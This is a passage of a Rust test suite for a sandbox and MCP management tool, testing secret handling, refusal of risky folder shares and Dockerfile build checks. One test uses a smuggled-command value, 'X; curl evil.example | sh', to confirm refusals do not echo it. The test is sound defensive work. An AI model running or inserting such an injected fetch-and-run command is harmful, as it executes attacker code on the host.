        std::env::set_var("OSH_TEST_EMPTY", "");
        let e = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_EMPTY"), false).unwrap_err();
        assert!(e.contains("OSH_TEST_EMPTY"), "{e}");
        std::env::remove_var("OSH_TEST_EMPTY");
        assert_eq!(f.calls(), "");

        // Set, but the provider cannot be created: the error and argv carry no secret.
        let value = secret_value();
        std::env::set_var("OSH_TEST_TOK", &value);
        std::env::set_var("OSH_FAKE_FAIL", "provider create");
        let e = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), false).unwrap_err();
        std::env::remove_var("OSH_TEST_TOK");
        assert!(!e.contains(&value), "{e}");
        let calls = f.calls();
        assert!(calls.contains("provider create"), "{calls}");
        assert!(!calls.contains(&value), "{calls}");
        assert!(!calls.contains("sandbox create"), "{calls}");
    }

    #[test]
    fn repo_provider_is_created_before_the_sandbox_through_the_environment() {
        let f = Fake::new("repo-ok");
        let repo = ghrepo::parse_url("https://github.com/o/r")
            .unwrap()
            .repo(ghrepo::Forge::GitHub)
            .unwrap();
        let var = ghrepo::token_env(&repo);
        std::env::set_var("OSH_FAKE_ENV_KEYS", var);
        let value = secret_value();
        std::env::set_var("OSH_TEST_TOK", &value);
        let v = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), false);
        std::env::remove_var("OSH_TEST_TOK");
        v.unwrap();
        let calls = f.calls();
        assert!(!calls.contains(&value), "{calls}");
        let lines: Vec<&str> = calls.lines().collect();
        let prov = lines
            .iter()
            .position(|l| l.starts_with("provider create --name github-w1-r"))
            .unwrap_or_else(|| panic!("{calls}"));
        assert_eq!(lines[prov + 1], format!("env {var} set"), "{calls}");
        let create = lines
            .iter()
            .position(|l| l.starts_with("sandbox create"))
            .unwrap();
        assert!(prov < create, "{calls}");
        assert!(lines[create].contains("--provider github-w1-r"), "{calls}");
    }

    #[test]
    fn dry_run_with_repo_creates_no_provider() {
        let f = Fake::new("repo-dry");
        std::env::set_var("OSH_TEST_TOK", secret_value());
        let v = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), true);
        std::env::remove_var("OSH_TEST_TOK");
        let v = v.unwrap();
        assert!(!v.to_string().contains(&secret_value()));
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn list_gives_name_phase_created() {
        let f = Fake::new("list");
        std::env::set_var(
            "OSH_FAKE_SANDBOXES",
            r#"{"sandboxes":[{"name":"w1","phase":"Ready","created_at":"2026-01-01","conditions":[]}]}"#,
        );
        let v = sandbox_list(&f.ctx()).unwrap();
        assert_eq!(
            v,
            json!([{"name":"w1","phase":"Ready","created":"2026-01-01"}])
        );
    }

    #[test]
    fn list_failure_is_err() {
        let f = Fake::new("list-fail");
        std::env::set_var("OSH_FAKE_FAIL", "sandbox list");
        assert!(sandbox_list(&f.ctx()).is_err());
    }

    #[test]
    fn delete_runs_sandbox_delete() {
        let f = Fake::new("delete");
        std::env::set_var(
            "OSH_FAKE_SANDBOXES",
            r#"{"sandboxes":[{"name":"w1","phase":"Ready","created_at":"t"}]}"#,
        );
        let v = sandbox_delete(&f.ctx(), "w1").unwrap();
        assert_eq!(v, json!({"name":"w1","deleted":true}));
        assert!(f.calls().lines().any(|l| l == "sandbox delete w1"));
    }

    #[test]
    fn delete_of_a_sandbox_already_gone_is_ok_and_still_drops_providers() {
        let f = Fake::new("delete-gone");
        let v = sandbox_delete(&f.ctx(), "w1").unwrap();
        assert_eq!(v, json!({"name":"w1","deleted":false,"already_gone":true}));
        let calls = f.calls();
        assert!(!calls.contains("sandbox delete"), "{calls}");
        // The provider list is read only for `drop_repo_providers`.
        assert!(
            calls.lines().any(|l| l.starts_with("provider list")),
            "{calls}"
        );
    }

    #[test]
    fn delete_tries_anyway_when_the_list_fails() {
        let f = Fake::new("delete-nolist");
        std::env::set_var("OSH_FAKE_FAIL", "sandbox list");
        let v = sandbox_delete(&f.ctx(), "w1").unwrap();
        assert_eq!(v, json!({"name":"w1","deleted":true}));
        assert!(f.calls().lines().any(|l| l == "sandbox delete w1"));
    }

    fn one_shot_with_repo() -> Value {
        let mut s = with_repo("OSH_TEST_TOK");
        s["command"] = json!("make test");
        s
    }

    #[test]
    fn a_one_shot_create_drops_its_repo_provider_after_it_ran() {
        for fail in [false, true] {
            let f = Fake::new(if fail { "oneshot-fail" } else { "oneshot-ok" });
            if fail {
                std::env::set_var("OSH_FAKE_FAIL", "sandbox create");
            }
            std::env::set_var("OSH_TEST_TOK", secret_value());
            let r = sandbox_create(&f.ctx(), &one_shot_with_repo(), false);
            std::env::remove_var("OSH_TEST_TOK");
            assert_eq!(r.is_err(), fail, "{r:?}");
            let calls = f.calls();
            let lines: Vec<&str> = calls.lines().collect();
            let create = lines
                .iter()
                .position(|l| l.starts_with("sandbox create"))
                .unwrap_or_else(|| panic!("{calls}"));
            assert!(
                lines[create].contains("--no-keep -- sh -c make test"),
                "{calls}"
            );
            let gone = lines
                .iter()
                .position(|l| *l == "provider delete github-w1-r")
                .unwrap_or_else(|| panic!("{calls}"));
            assert!(create < gone, "{calls}");
            assert_eq!(
                lines
                    .iter()
                    .filter(|l| l.starts_with("provider delete"))
                    .count(),
                1,
                "{calls}"
            );
        }
    }

    #[test]
    fn a_kept_create_keeps_its_repo_provider() {
        let f = Fake::new("kept");
        std::env::set_var("OSH_TEST_TOK", secret_value());
        let r = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), false);
        std::env::remove_var("OSH_TEST_TOK");
        let v = r.unwrap();
        assert!(!f.calls().contains("provider delete"), "{}", f.calls());
        // git in the sandbox is set up for the grant, so a push from there works (the sandbox
        // script is only logged by the fake, never run on the host).
        assert!(
            f.calls().contains("credential.https://github.com.helper"),
            "{}",
            f.calls()
        );
        assert!(v.get("git_configured").is_some(), "{v}");
    }

    #[test]
    fn a_one_shot_create_does_not_configure_git() {
        let f = Fake::new("oneshot-nogit");
        std::env::set_var("OSH_TEST_TOK", secret_value());
        let r = sandbox_create(&f.ctx(), &one_shot_with_repo(), false);
        std::env::remove_var("OSH_TEST_TOK");
        r.unwrap();
        assert!(
            !f.calls().contains("credential.https://github.com.helper"),
            "{}",
            f.calls()
        );
    }

    #[test]
    fn a_profile_import_that_lost_a_race_carries_on() {
        let f = Fake::new("import-race");
        // The first describe says "missing", the import then fails ("already exists": the other
        // create made it), and the second describe finds it.
        std::env::set_var("OSH_FAKE_FAIL_ONCE", "profile describe");
        std::env::set_var("OSH_FAKE_FAIL", "profile import");
        std::env::set_var("OSH_TEST_TOK", secret_value());
        let r = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), false);
        std::env::remove_var("OSH_TEST_TOK");
        r.unwrap();
        let calls = f.calls();
        let lines: Vec<&str> = calls.lines().collect();
        let import = lines
            .iter()
            .find(|l| l.starts_with("profile import --file "))
            .unwrap_or_else(|| panic!("{calls}"));
        let file = Path::new(import.trim_start_matches("profile import --file "));
        assert!(!file.exists(), "{file:?}");
        let name = file.file_name().unwrap().to_string_lossy().into_owned();
        assert!(name.contains(&std::process::id().to_string()), "{name}");
        assert_eq!(
            lines
                .iter()
                .filter(|l| l.starts_with("profile describe"))
                .count(),
            2,
            "{calls}"
        );
        assert!(
            calls.contains("provider create --name github-w1-r"),
            "{calls}"
        );
        assert!(calls.contains("sandbox create"), "{calls}");
        // Not this call's profile: never deleted by it.
        assert!(!calls.contains("profile delete"), "{calls}");
    }

    #[test]
    fn a_failed_import_without_the_profile_is_err() {
        let f = Fake::new("import-fail");
        std::env::set_var("OSH_FAKE_FAIL", "profile ");
        std::env::set_var("OSH_TEST_TOK", secret_value());
        let r = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), false);
        std::env::remove_var("OSH_TEST_TOK");
        assert!(r.is_err());
        let calls = f.calls();
        assert!(calls.contains("profile import"), "{calls}");
        assert!(!calls.contains("provider create"), "{calls}");
        assert!(!calls.contains("sandbox create"), "{calls}");
    }

    /// A folder that is not under a system folder on any test host (macOS temp dirs resolve
    /// to `/private/var/...`, which is one).
    fn project_dir(tag: &str) -> PathBuf {
        let d = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../target")
            .join(format!("osh-share-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(d.join("app")).unwrap();
        d.join("app")
    }

    fn share_ctx(f: &Fake, refuse: bool) -> Ctx {
        Ctx {
            allow_share: true,
            refuse_risky_share: refuse,
            ..f.ctx()
        }
    }

    #[test]
    fn risky_shares_are_refused_over_mcp_and_noted_on_the_cli() {
        let f = Fake::new("risky");
        let home = f.dir.parent().unwrap().join("home");
        std::fs::create_dir_all(home.join(".ssh")).unwrap();
        let to_root = f.dir.parent().unwrap().join("to-root");
        std::os::unix::fs::symlink("/", &to_root).unwrap();
        let h = home.to_str().unwrap();
        for p in [
            PathBuf::from("/"),
            to_root.clone(),
            home.clone(),
            home.join(".ssh"),
        ] {
            let e = create_in(&share_ctx(&f, true), &with_share(&p), true, h).unwrap_err();
            assert!(e.contains("refused"), "{p:?}: {e}");
            let e = apply_in(&share_ctx(&f, true), &with_share(&p), h).unwrap_err();
            assert!(e.contains("refused"), "{p:?}: {e}");
            let cli = create_in(&share_ctx(&f, false), &with_share(&p), true, h);
            if std::fs::canonicalize(&p).unwrap() == Path::new("/") {
                // The disk has no folder name to mount under, so the CLI cannot share it either.
                assert!(cli.unwrap_err().contains("no folder name"), "{p:?}");
                continue;
            }
            let v = cli.unwrap();
            let note = v["note"].as_str().unwrap_or_else(|| panic!("{p:?}: {v}"));
            assert!(note.contains("risky"), "{note}");
        }
        assert!(!f.calls().contains("sandbox create"), "{}", f.calls());
        // The symlink is refused as what it points at.
        let e = create_in(&share_ctx(&f, true), &with_share(&to_root), true, h).unwrap_err();
        assert!(e.contains("sharing / is refused"), "{e}");
    }

    #[test]
    fn mcp_shares_must_lie_inside_a_share_root() {
        let f = Fake::new("roots");
        let home = f.dir.parent().unwrap().join("home");
        std::fs::create_dir_all(&home).unwrap();
        let h = home.to_str().unwrap();
        let base = project_dir("roots");
        let root = base.join("proj");
        for d in ["proj/sub", "proj-evil", "outside"] {
            std::fs::create_dir_all(base.join(d)).unwrap();
        }
        std::os::unix::fs::symlink(base.join("outside"), root.join("link")).unwrap();
        let root = std::fs::canonicalize(&root).unwrap();
        let mcp = |roots: Vec<PathBuf>| Ctx {
            share_roots: Some(roots),
            ..share_ctx(&f, true)
        };
        let ctx = mcp(vec![root.clone()]);
        for ok in [root.join("sub"), root.clone()] {
            let v = create_in(&ctx, &with_share(&ok), true, h).unwrap();
            assert!(v.get("note").is_none(), "{ok:?}: {v}");
            apply_in(&ctx, &with_share(&ok), h).unwrap();
        }
        for bad in [
            base.join("outside"),
            base.join("proj-evil"),
            root.join("link"),
            root.join("../outside"),
        ] {
            for e in [
                create_in(&ctx, &with_share(&bad), true, h).unwrap_err(),
                apply_in(&ctx, &with_share(&bad), h).unwrap_err(),
            ] {
                let real = std::fs::canonicalize(&bad).unwrap();
                assert!(
                    e.contains(real.to_str().unwrap())
                        && e.contains("outside the allowed share roots"),
                    "{bad:?}: {e}"
                );
            }
        }
        // Shares on but no valid root: every share is refused, naming the variable.
        let e = create_in(&mcp(Vec::new()), &with_share(&root), true, h).unwrap_err();
        assert!(e.contains("OSH_MCP_SHARE_ROOT"), "{e}");
        // The refusal is the user's steps: the commands, no restart, the way out without a share.
        assert!(
            e.contains("osh config set mcp.allow_share true")
                && e.contains("osh config set mcp.share_roots")
                && e.contains("No restart is needed")
                && e.contains("without it"),
            "{e}"
        );
        // The CLI has no roots: a folder outside them is shared as before.
        create_in(
            &share_ctx(&f, false),
            &with_share(&base.join("outside")),
            true,
            h,
        )
        .unwrap();
        // Only the accepted shares reached `sandbox create` (apply is not a dry run).
        let calls = f.calls();
        assert!(
            !calls.contains("/outside") && !calls.contains("proj-evil"),
            "{calls}"
        );
        let _ = std::fs::remove_dir_all(base.parent().unwrap());
    }

    #[test]
    fn a_project_folder_is_shared_by_its_real_path() {
        let f = Fake::new("project");
        let home = f.dir.parent().unwrap().join("home");
        std::fs::create_dir_all(&home).unwrap();
        let project = project_dir("real");
        let real = std::fs::canonicalize(&project).unwrap();
        let link = f.dir.parent().unwrap().join("app");
        std::os::unix::fs::symlink(&project, &link).unwrap();
        let h = home.to_str().unwrap();
        let v = create_in(&share_ctx(&f, true), &with_share(&link), false, h).unwrap();
        assert!(v.get("note").is_none(), "{v}");
        let calls = f.calls();
        let line = calls
            .lines()
            .find(|l| l.starts_with("sandbox create"))
            .unwrap();
        let real = real.to_str().unwrap();
        assert!(line.contains(&format!("\"source\":\"{real}\"")), "{line}");
        let label = format!("{}={}", cli::SHARE_LABEL, cli::share_key(real));
        assert!(line.contains(&label), "{line}");
        let _ = std::fs::remove_dir_all(project.parent().unwrap());
    }

    #[test]
    fn a_risky_note_joins_the_policy_note() {
        let f = Fake::new("two-notes");
        std::fs::write(f.dir.join("toolchains.toml"), "not [valid").unwrap();
        let home = f.dir.parent().unwrap().join("home");
        std::fs::create_dir_all(&home).unwrap();
        let v = create_in(
            &share_ctx(&f, false),
            &with_share(&home),
            true,
            home.to_str().unwrap(),
        )
        .unwrap();
        let note = v["note"].as_str().unwrap();
        assert!(
            note.contains("risky") && note.contains("toolchains.toml"),
            "{note}"
        );
    }

    #[test]
    fn repo_vars_limit_what_env_var_may_name() {
        let f = Fake::new("repo-vars");
        std::env::set_var("OSH_TEST_TOK", secret_value());
        let with = |list: Option<&[&str]>| Ctx {
            repo_vars: list.map(|l| l.iter().map(|s| s.to_string()).collect()),
            ..f.ctx()
        };
        let none = sandbox_create(&with(Some(&[])), &with_repo("OSH_TEST_TOK"), true);
        let other = sandbox_create(&with(Some(&["OTHER"])), &with_repo("OSH_TEST_TOK"), true);
        let ok = sandbox_create(
            &with(Some(&["OTHER", "OSH_TEST_TOK"])),
            &with_repo("OSH_TEST_TOK"),
            true,
        );
        let cli_any = sandbox_create(&with(None), &with_repo("OSH_TEST_TOK"), true);
        let applied = apply(&with(Some(&[])), &with_repo("OSH_TEST_TOK"));
        std::env::remove_var("OSH_TEST_TOK");
        let e = none.unwrap_err();
        assert!(e.contains("OSH_MCP_REPO_VARS"), "{e}");
        let e = other.unwrap_err();
        assert!(
            e.contains("OSH_TEST_TOK") && e.contains("OSH_MCP_REPO_VARS"),
            "{e}"
        );
        for e in [&e, &applied.unwrap_err()] {
            assert!(!e.contains(&secret_value()), "{e}");
        }
        ok.unwrap();
        cli_any.unwrap();
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn a_stored_secret_allows_its_name_and_supplies_the_token() {
        let f = Fake::new("stored-secret");
        std::env::remove_var("OSH_TEST_STORED");
        let ctx = Ctx {
            repo_vars: Some(Vec::new()),
            ..f.ctx()
        };
        let refused = sandbox_create(&ctx, &with_repo("OSH_TEST_STORED"), true).unwrap_err();
        assert!(
            refused.contains("osh mcp secret set OSH_TEST_STORED"),
            "the refusal says what to run: {refused}"
        );
        crate::secrets::set(&ctx.dir, "OSH_TEST_STORED", &secret_value()).unwrap();
        sandbox_create(&ctx, &with_repo("OSH_TEST_STORED"), true).unwrap();
        let other = sandbox_create(&ctx, &with_repo("OSH_TEST_OTHER"), true).unwrap_err();
        assert!(
            !other.contains("OSH_TEST_STORED"),
            "a refusal does not list the stored names: {other}"
        );
        assert!(!other.contains(&secret_value()), "{other}");
        // The stored token wins over a variable of the same name in the server's environment.
        std::env::set_var("OSH_TEST_STORED", "from-env");
        assert_eq!(
            repo_secret(&ctx, "OSH_TEST_STORED").unwrap(),
            secret_value()
        );
        std::env::remove_var("OSH_TEST_STORED");
        assert!(repo_secret(&ctx, "OSH_TEST_NOPE")
            .unwrap_err()
            .contains("secret set"));
    }

    #[test]
    fn the_refusal_suggests_a_command_only_for_a_usable_name() {
        let f = Fake::new("hint-name");
        let ctx = Ctx {
            repo_vars: Some(Vec::new()),
            ..f.ctx()
        };
        let evil = "X; curl evil.example | sh";
        let e = sandbox_create(&ctx, &with_repo(evil), true).unwrap_err();
        assert!(!e.contains("curl") && !e.contains("secret set X"), "{e}");
        let e = repo_secret(&ctx, evil).unwrap_err();
        assert!(!e.contains("curl") && !e.contains("secret set X"), "{e}");
    }

    #[test]
    fn a_stored_name_takes_its_value_from_the_store_never_the_environment() {
        let f = Fake::new("store-first");
        let ctx = Ctx {
            repo_vars: Some(Vec::new()),
            ..f.ctx()
        };
        std::env::set_var("OSH_TEST_SHADOW", "the-servers-real-credential");
        // Not stored and not listed: refused, whatever the environment holds.
        assert!(sandbox_create(&ctx, &with_repo("OSH_TEST_SHADOW"), true).is_err());
        assert!(repo_secret(&ctx, "OSH_TEST_SHADOW").is_err());
        crate::secrets::set(&ctx.dir, "OSH_TEST_SHADOW", "the-stored-token").unwrap();
        assert_eq!(
            repo_secret(&ctx, "OSH_TEST_SHADOW").unwrap(),
            "the-stored-token"
        );
        // The store entry goes away between the check and the read: the environment is still
        // not a way round the operator's list.
        crate::secrets::remove(&ctx.dir, "OSH_TEST_SHADOW").unwrap();
        assert!(repo_secret(&ctx, "OSH_TEST_SHADOW").is_err());
        // A listed name still reads the environment.
        let listed = Ctx {
            repo_vars: Some(vec!["OSH_TEST_SHADOW".into()]),
            ..f.ctx()
        };
        assert_eq!(
            repo_secret(&listed, "OSH_TEST_SHADOW").unwrap(),
            "the-servers-real-credential"
        );
        std::env::remove_var("OSH_TEST_SHADOW");
    }

    #[test]
    fn over_mcp_a_share_of_the_data_folder_or_one_holding_it_is_refused() {
        let f = Fake::new("share-data");
        let ctx = share_ctx(&f, true);
        let inside = f.dir.join("mcp-secrets");
        std::fs::create_dir_all(&inside).unwrap();
        for p in [f.dir.clone(), inside, f.dir.parent().unwrap().to_path_buf()] {
            let e = create_in(&ctx, &with_share(&p), true, "/nonexistent-home").unwrap_err();
            assert!(
                e.contains("refused") && e.contains("osh's own data"),
                "{p:?}: {e}"
            );
        }
        // On the command line it is a note, as for other risky folders.
        let cli = share_ctx(&f, false);
        let r = create_in(&cli, &with_share(&f.dir), true, "/nonexistent-home").unwrap();
        assert!(r.to_string().contains("osh's own data"), "{r}");
    }

    const URL: &str = "https://github.com/o/r";

    fn with_image_and_profiles(f: &Fake) {
        std::fs::create_dir_all(f.dir.join("images")).unwrap();
        std::fs::write(
            f.dir.join("images/Dockerfile-claude_code"),
            "# syntax=docker/dockerfile:1\n\n# Claude Code and its tools.\nFROM scratch\n",
        )
        .unwrap();
        std::fs::create_dir_all(f.dir.join("providers")).unwrap();
        std::fs::write(
            f.dir.join("providers/rust.yaml"),
            "id: rust\ndisplay_name: Rust\ndescription: crates\nendpoints: []\n",
        )
        .unwrap();
        std::fs::write(
            f.dir.join("providers/github.yaml"),
            "id: github\ndisplay_name: GitHub\ndescription: x\ncredentials:\n  - name: t\n    env_vars: [GITHUB_TOKEN]\n",
        )
        .unwrap();
    }

    #[test]
    fn a_kept_sandbox_defaults_to_the_claude_code_image_and_a_throwaway_does_not() {
        let f = Fake::new("default-image");
        with_image_and_profiles(&f);
        let kept = json!({"name":"w1"});
        let v = sandbox_create(&f.ctx(), &kept, true).unwrap();
        let args = v["steps"].to_string();
        assert!(
            args.contains("--from") && args.contains("claude-code:latest"),
            "{args}"
        );
        assert!(
            v["note"].as_str().unwrap().contains("claude-code:latest"),
            "{v}"
        );
        let own = json!({"name":"w1","image":"other:1"});
        assert!(!sandbox_create(&f.ctx(), &own, true).unwrap()["steps"]
            .to_string()
            .contains("claude-code"));
        let once = json!({"name":"w1","command":"true"});
        assert!(!sandbox_create(&f.ctx(), &once, true).unwrap()["steps"]
            .to_string()
            .contains("claude-code"));
    }

    const ENV_IMAGE: &str = "FROM claude-code:latest\nUSER root\nRUN apt-get update && apt-get install --yes gcc\nUSER node\n";

    #[test]
    fn image_build_checks_writes_and_builds_the_base_then_the_image() {
        let f = Fake::new("image-build");
        with_image_and_profiles(&f);
        // dry_run: the text back, nothing written or built.
        let v = image_build(&f.ctx(), "claude-code-gcc", ENV_IMAGE, &[], true).unwrap();
        assert_eq!(v["image"], "claude-code-gcc:latest");
        assert!(v["dockerfile"]
            .as_str()
            .unwrap()
            .contains("FROM claude-code:latest"));
        assert!(v.get("note").is_none(), "{v}");
        assert!(!f.dir.join("images/Dockerfile-claude-code-gcc").exists());
        assert_eq!(f.runtime_calls().matches("build -f").count(), 0);
        assert!(f.runtime_calls().contains("build --check"));
        // For real: written, then the base (osh's own, not built) and the image built, the image
        // in an empty folder rather than the data folder.
        let v = image_build(&f.ctx(), "claude-code-gcc", ENV_IMAGE, &ok(), false).unwrap();
        assert_eq!(v["built"], true);
        assert!(f.dir.join("images/Dockerfile-claude-code-gcc").is_file());
        let built = f.runtime_calls();
        let builds: Vec<&str> = built
            .lines()
            .filter(|l| l.starts_with("build -f"))
            .collect();
        assert_eq!(builds.len(), 2, "{built}");
        assert!(builds[0].contains("-t claude-code:latest"), "{built}");
        assert!(builds[1].contains("-t claude-code-gcc:latest"), "{built}");
        assert!(!builds[1].trim_end().ends_with("images"), "{}", builds[1]);
        assert!(builds[1].contains("osh-build-ctx-"), "{}", builds[1]);
        // The new image is offered to the next call, and never overwritten.
        assert!(sandbox_options(&f.ctx())
            .unwrap()
            .to_string()
            .contains("claude-code-gcc:latest"));
        let e = image_build(&f.ctx(), "claude-code-gcc", ENV_IMAGE, &ok(), false).unwrap_err();
        assert!(e.contains("already exists"), "{e}");
    }

    #[test]
    fn only_osh_images_can_be_deleted_and_a_used_one_is_not_forced() {
        let f = Fake::new("image-delete");
        with_image_and_profiles(&f);
        let img = |n: &str| f.dir.join(format!("images/Dockerfile-{n}"));
        for n in ["my-built", "built-inuse", "idle"] {
            std::fs::write(img(n), "FROM scratch\n").unwrap();
        }
        // Not an osh image: refused, and the message names what can be deleted.
        let e = image_delete(&f.ctx(), "postgres:17-alpine", false).unwrap_err();
        assert!(
            e.contains("not an osh image") && e.contains("my-built:latest"),
            "{e}"
        );
        assert!(!f.runtime_calls().contains("image rm"));
        // Built: removed from the runtime by tag; the name works with or without :latest.
        let v = image_delete(&f.ctx(), "my-built", false).unwrap();
        assert_eq!(v["deleted"], true);
        assert!(f.runtime_calls().contains("image rm my-built:latest"));
        assert!(
            img("my-built").exists(),
            "the Dockerfile stays unless asked"
        );
        // And the Dockerfile on request.
        let v = image_delete(&f.ctx(), "my-built:latest", true).unwrap();
        assert_eq!(v["dockerfile_removed"], true);
        assert!(!img("my-built").exists());
        // In use: the runtime says no, osh does not force it.
        let e = image_delete(&f.ctx(), "built-inuse", false).unwrap_err();
        assert!(e.contains("sandbox") && e.contains("deleted first"), "{e}");
        assert!(
            !f.runtime_calls().contains("rmi") && !f.runtime_calls().contains("-f built-inuse")
        );
        // Not built: nothing to delete, unless the Dockerfile is the target.
        assert!(image_delete(&f.ctx(), "idle", false)
            .unwrap_err()
            .contains("not built"));
        image_delete(&f.ctx(), "idle", true).unwrap();
        assert!(!img("idle").exists());
        // A shipped Dockerfile is never removed, only its image.
        std::fs::write(f.dir.join("images/Dockerfile-pi"), "FROM scratch\n").unwrap();
        let e = image_delete(&f.ctx(), "pi", true).unwrap_err();
        assert!(e.contains("ships with osh"), "{e}");
    }

    fn ok() -> Vec<String> {
        vec!["true".into()]
    }

    #[test]
    fn a_build_must_name_what_it_verifies_and_a_failed_check_removes_the_image() {
        let f = Fake::new("image-verify");
        with_image_and_profiles(&f);
        let e = image_build(&f.ctx(), "v", ENV_IMAGE, &[], false).unwrap_err();
        assert!(e.contains("`verify` is required"), "{e}");
        let d = image_build(&f.ctx(), "v", ENV_IMAGE, &["cargo --version".into()], true).unwrap();
        assert_eq!(d["verify"][0], "cargo --version");
        assert!(d["show_user"].as_str().unwrap().contains("in full"), "{d}");
        // A command that fails in the clean container: error, image and Dockerfile removed.
        let e = image_build(&f.ctx(), "v", ENV_IMAGE, &["FAILME".into()], false).unwrap_err();
        assert!(
            e.contains("clean environment") && e.contains("removed"),
            "{e}"
        );
        assert!(!f.dir.join("images/Dockerfile-v").exists());
        let calls = f.runtime_calls();
        assert!(calls.contains("image rm v:latest"), "{calls}");
        assert!(calls.contains("rm -f osh-verify-"), "{calls}");
        // The same name can be tried again, and passes.
        let v = image_build(&f.ctx(), "v", ENV_IMAGE, &["cargo --version".into()], false).unwrap();
        assert_eq!(v["verified"][0], "cargo --version");
        assert!(f.runtime_calls().contains("run --rm --name osh-verify-"));
    }

    #[test]
    fn the_runtimes_own_parser_vets_the_dockerfile() {
        let f = Fake::new("image-lint");
        with_image_and_profiles(&f);
        // A syntax error is refused, before anything is written or built.
        let e = image_build(
            &f.ctx(),
            "bad",
            "FROM debian\nFORM x\nUSER node\n",
            &ok(),
            false,
        )
        .unwrap_err();
        assert!(e.contains("does not parse") && e.contains("FORM"), "{e}");
        assert!(!f.dir.join("images/Dockerfile-bad").exists());
        assert_eq!(f.runtime_calls().matches("build -f").count(), 0);
        // A lint warning comes back as a note, on a dry run and on the real build.
        let text = "FROM debian\n# LINTME\nUSER node\n";
        let v = image_build(&f.ctx(), "warn", text, &[], true).unwrap();
        assert!(
            v["note"].as_str().unwrap().contains("StubRule: lint me"),
            "{v}"
        );
        let v = image_build(&f.ctx(), "warn", text, &ok(), false).unwrap();
        assert_eq!(v["built"], true);
        assert!(v["note"].as_str().unwrap().contains("StubRule"), "{v}");
    }

    #[test]
    fn lint_output_is_read_as_error_warnings_or_no_verdict() {
        assert!(lint_verdict(true, "").unwrap().is_none());
        let w = "WARNING: FromAsCasing - https://x\n'as' casing\nDockerfile:1\n";
        assert_eq!(
            lint_verdict(true, w).unwrap().unwrap(),
            "lint: FromAsCasing: 'as' casing"
        );
        let e = "#1 x\nERROR: dockerfile parse error on line 4: unknown instruction: FORM\nDockerfile:4\n";
        assert!(lint_verdict(false, e).unwrap_err().contains("FORM"));
        // No `--check`, or a daemon that is down: no verdict, not a refusal.
        assert!(lint_verdict(false, "unknown flag: --check")
            .unwrap()
            .is_none());
        assert!(lint_verdict(false, "Cannot connect to the Docker daemon")
            .unwrap()
            .is_none());
    }

    #[test]
    fn image_build_refuses_what_it_should_not_build() {
        let f = Fake::new("image-build-refuse");
        with_image_and_profiles(&f);
        for (name, text, want) in [
            ("Bad Name", ENV_IMAGE, "lowercase"),
            ("x", "RUN echo hi\n", "FROM"),
            (
                "x",
                "FROM debian\nRUN --network=host curl x\n",
                "host access",
            ),
            (
                "x",
                "FROM debian\nRUN --security=insecure true\n",
                "host access",
            ),
        ] {
            let e = image_build(&f.ctx(), name, text, &ok(), false).unwrap_err();
            assert!(e.contains(want), "{name}: {e}");
        }
        let big = format!("FROM debian\n{}", "# x\n".repeat(20_000));
        assert!(image_build(&f.ctx(), "x", &big, &[], true)
            .unwrap_err()
            .contains("64 KB"));
        assert_eq!(f.runtime_calls().matches("build").count(), 0);
        assert!(!f.dir.join("images/Dockerfile-x").exists());
    }

    #[test]
    fn an_image_that_ends_as_root_is_flagged_and_stages_are_not_bases() {
        let f = Fake::new("image-build-root");
        with_image_and_profiles(&f);
        let v = image_build(&f.ctx(), "x", "FROM debian:trixie\nRUN true\n", &[], true).unwrap();
        assert!(v["note"].as_str().unwrap().contains("USER node"), "{v}");
        let v = image_build(
            &f.ctx(),
            "x",
            "FROM debian AS b\nFROM b\nUSER node\n",
            &[],
            true,
        )
        .unwrap();
        assert!(v.get("note").is_none(), "{v}");
        assert_eq!(
            from_images("FROM --platform=linux/amd64 a:1 AS s\nFROM s\nFROM b:2\n"),
            ["a:1", "b:2"]
        );
    }

    #[test]
    fn image_guide_gives_the_rules_and_the_shipped_dockerfiles() {
        let f = Fake::new("image-guide");
        with_image_and_profiles(&f);
        let v = image_guide(&f.ctx()).unwrap();
        let guide = v["guide"].as_str().unwrap();
        for want in [
            "NEEDS A NEW IMAGE",
            "WORKS AT RUN TIME",
            "no root",
            "USER node",
            "dry_run",
        ] {
            assert!(guide.contains(want), "{want}");
        }
        assert!(v["dockerfiles"].to_string().contains("claude-code:latest"));
    }

    #[test]
    fn a_provider_is_the_gateways_a_credential_free_profile_or_refused() {
        let f = Fake::new("providers");
        with_image_and_profiles(&f);
        // Unknown: refused, and the answer names what would have worked.
        let e = sandbox_create(&f.ctx(), &json!({"name":"w1","providers":["nope"]}), false)
            .unwrap_err();
        assert!(e.contains("sandbox_options") && e.contains("rust"), "{e}");
        // A profile that wants a credential is the user's to add.
        let e = sandbox_create(
            &f.ctx(),
            &json!({"name":"w1","providers":["github"]}),
            false,
        )
        .unwrap_err();
        assert!(e.contains("needs a credential"), "{e}");
        // The user's steps: where to get it, the command, no chat, how to remove it, no revoke.
        assert!(e.contains("osh mcp provider add github"), "{e}");
        assert!(e.contains("personal-access-tokens/new"), "{e}");
        assert!(
            e.contains("GITHUB_TOKEN") && e.contains("hidden prompt"),
            "{e}"
        );
        assert!(e.contains("does NOT revoke"), "{e}");
        let e = provider_keys(&f.ctx(), "rust").unwrap_err();
        assert!(e.contains("needs no credential"), "{e}");
        assert!(provider_keys(&f.ctx(), "nope").is_err());
        assert_eq!(provider_keys(&f.ctx(), "github").unwrap(), ["GITHUB_TOKEN"]);
        assert!(!f.calls().contains("sandbox create"), "{}", f.calls());
        // A credential-free profile is created, then the sandbox.
        sandbox_create(&f.ctx(), &json!({"name":"w1","providers":["rust"]}), false).unwrap();
        // The default image was built through the faked runtime, never the real one.
        assert!(f.runtime_calls().contains("build"), "{}", f.runtime_calls());
        let calls = f.calls();
        let made = calls
            .find("provider create")
            .unwrap_or_else(|| panic!("{calls}"));
        assert!(made < calls.find("sandbox create").unwrap(), "{calls}");
    }

    #[test]
    fn sandbox_options_lists_images_providers_and_toolchains() {
        let f = Fake::new("options");
        with_image_and_profiles(&f);
